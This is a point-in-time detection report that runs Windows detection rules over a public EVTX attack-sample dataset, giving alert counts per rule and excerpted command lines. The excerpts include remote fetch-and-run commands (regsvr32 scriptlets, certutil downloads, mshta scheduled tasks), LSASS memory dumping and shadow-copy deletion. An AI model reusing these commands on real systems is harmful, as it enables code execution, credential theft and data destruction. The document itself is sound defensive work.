# Real-telemetry sweep

_Point-in-time report. Dataset: sbousseaden/EVTX-ATTACK-SAMPLES @ `4ceed2f470` (278 captures). Regenerate with `python -m tools.sweep <path> <commit>`._

LSASS handle-access events in the dataset: **28**; flagged by the LSASS rule: **23**.

| Rule | Captures with alerts |
|---|---|
| `proc_access_win_lsass_suspicious_access` | 12 |
| `proc_creation_win_certutil_urlcache_download` | 1 |
| `proc_creation_win_comsvcs_minidump` | 1 |
| `proc_creation_win_office_spawns_shell` | 1 |
| `proc_creation_win_powershell_encoded_command` | 1 |
| `proc_creation_win_regsvr32_remote_scriptlet` | 6 |
| `proc_creation_win_rundll32_non_dll_file` | 1 |
| `proc_creation_win_schtasks_suspicious_create` | 4 |
| `proc_creation_win_vssadmin_delete_shadows` | 1 |
| `win_security_event_log_cleared` | 24 |
| `win_security_kerberoasting_rc4_tgs` | 0 |

## `proc_access_win_lsass_suspicious_access`

- `AutomatedTestingTools/PanacheSysmon_vs_AtomicRedTeam01.evtx` (1): `C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -> C:\Windows\system32\lsass.exe (0x1010)`
- `Credential Access/CA_sysmon_hashdump_cmd_meterpreter.evtx` (1): `\\VBOXSVR\HTools\voice_mail.msg.exe -> C:\Windows\system32\lsass.exe (0x1f1fff)`
- `Credential Access/babyshark_mimikatz_powershell.evtx` (2): `C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -> C:\Windows\system32\lsass.exe (0x1010)`
- `Credential Access/sysmon_10_11_lsass_memdump.evtx` (2): `C:\Users\IEUser\Desktop\procdump.exe -> C:\Windows\system32\lsass.exe (0x1fffff)`
- `Credential Access/sysmon_10_11_outlfank_dumpert_and_andrewspecial_memdump.evtx` (8): `C:\Users\administrator\Desktop\x64\Outflank-Dumpert.exe -> C:\Windows\system32\lsass.exe (0x1fffff)`
- `Credential Access/sysmon_10_lsass_mimikatz_sekurlsa_logonpasswords.evtx` (1): `C:\Users\IEUser\Desktop\mimikatz_trunk\Win32\mimikatz.exe -> C:\Windows\system32\lsass.exe (0x1010)`
- `Credential Access/sysmon_2x10_lsass_with_different_pid_RtlCreateProcessReflection.evtx` (3): `C:\Users\Public\tools\SysinternalsSuite\procdump.exe -> C:\windows\system32\lsass.exe (0x1fffff)`
- `Credential Access/sysmon_3_10_Invoke-Mimikatz_hosted_Github.evtx` (1): `C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -> C:\Windows\system32\lsass.exe (0x143a)`
- `Credential Access/tutto_malseclogon.evtx` (1): `Z:\bouss\Downloads\MalSeclogon-master\x64\Debug\MalSeclogon.exe -> C:\Windows\system32\lsass.exe (0x1410)`
- `Defense Evasion/DE_BYOV_Zam64_CA_Memdump_sysmon_7_10.evtx` (1): `c:\Users\Public\BYOV\ZAM64\ppldump.exe -> C:\Windows\system32\lsass.exe (0x1fffff)`

## `proc_creation_win_certutil_urlcache_download`

- `AutomatedTestingTools/panache_sysmon_vs_EDRTestingScript.evtx` (1): `certutil.exe  -urlcache -split -f https://raw.githubusercontent.com/op7ic/EDR-Testing-Script/master/Payloads/C`

## `proc_creation_win_comsvcs_minidump`

- `Credential Access/sysmon_10_1_memdump_comsvcs_minidump.evtx` (1): `rundll32 C:\windows\system32\comsvcs.dll, MiniDump 4868 C:\Windows\System32\notepad.bin full`

## `proc_creation_win_office_spawns_shell`

- `AutomatedTestingTools/Malware/sideloading_uacbypass_rundll32_injection_c2.evtx` (1): `cmd /c ping 127.0.0.1&&del del /F /Q /A:H "C:\Users\IEUser\AppData\Roaming\wwlib.dll"`

## `proc_creation_win_powershell_encoded_command`

- `Credential Access/discovery_sysmon_1_iis_pwd_and_config_discovery_appcmd.evtx` (1): `"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"  -nop -noni -enc JABQAHIAbwBnAHIAZQBzAHMAUAByAGUAZ`

## `proc_creation_win_regsvr32_remote_scriptlet`

- `AutomatedTestingTools/PanacheSysmon_vs_AtomicRedTeam01.evtx` (2): `"C:\Windows\system32\cmd.exe" /c "regsvr32.exe /s /u /i:https://raw.githubusercontent.com/redcanaryco/atomic-r`
- `AutomatedTestingTools/panache_sysmon_vs_EDRTestingScript.evtx` (2): `cmd  /c regsvr32.exe /s /u /i:https://raw.githubusercontent.com/op7ic/EDR-Testing-Script/master/Payloads/Cmstp`
- `Execution/exec_sysmon_1_7_jscript9_defense_evasion.evtx` (1): `/u /s /i:https://raw.githubusercontent.com/3gstudent/SCTPersistence/master/calc.sct scrobj.dll`
- `Execution/exec_sysmon_1_lolbin_renamed_regsvr32_scrobj.evtx` (1): `jabber.exe  /u /s /i:http://pastebin.com/raw/H4A4iDTA .\jabber.dll`
- `Execution/exec_sysmon_lobin_regsvr32_sct.evtx` (1): `regsvr32.exe  /u /s /i:http://pastebin.com/raw/H4A4iDTA scrobj.dll`
- `Persistence/sysmon_1_persist_bitsjob_SetNotifyCmdLine.evtx` (1): `/u /s /i:https://raw.githubusercontent.com/3gstudent/SCTPersistence/master/calc.sct scrobj.dll`

## `proc_creation_win_rundll32_non_dll_file`

- `Other/maldoc_mshta_via_shellbrowserwind_rundll32.evtx` (1): `"C:\Windows\System32\rundll32.exe" c:\users\public\memViewData.jpg,PluginInit`

## `proc_creation_win_schtasks_suspicious_create`

- `AutomatedTestingTools/Malware/rundll32_cmd_schtask.evtx` (1): `schtasks  /Create /f /XML C:\Users\IEUser\AppData\Local\Temp\sduchxll.tmp /TN DataUsageHandlers`
- `Execution/exec_persist_rundll32_mshta_scheduledtask_sysmon_1_3_11.evtx` (1): `"C:\Windows\System32\schtasks.exe" /Create /sc MINUTE /MO 60 /TN MSOFFICE_ /TR "mshta.exe https://hotelesms.co`
- `Execution/sysmon_exec_from_vss_persistence.evtx` (1): `C:\Windows\system32\schtasks.exe  /create /sc minute /mo 1 /tn "eyNQLDvUSuvVPg" /tr "\\?\GLOBALROOT\Device\Har`
- `Privilege Escalation/sysmon_1_11_exec_as_system_via_schedtask.evtx` (1): `"C:\Windows\System32\schtasks.exe" /create /xml c:\users\ieuser\appdata\local\temp\elevator.xml /tn elevator`

## `proc_creation_win_vssadmin_delete_shadows`

- `AutomatedTestingTools/PanacheSysmon_vs_AtomicRedTeam01.evtx` (1): `vssadmin.exe  delete shadows /all /quiet`

## `win_security_kerberoasting_rc4_tgs`

_No capture in this dataset exercises this rule (validated with synthetic events only)._
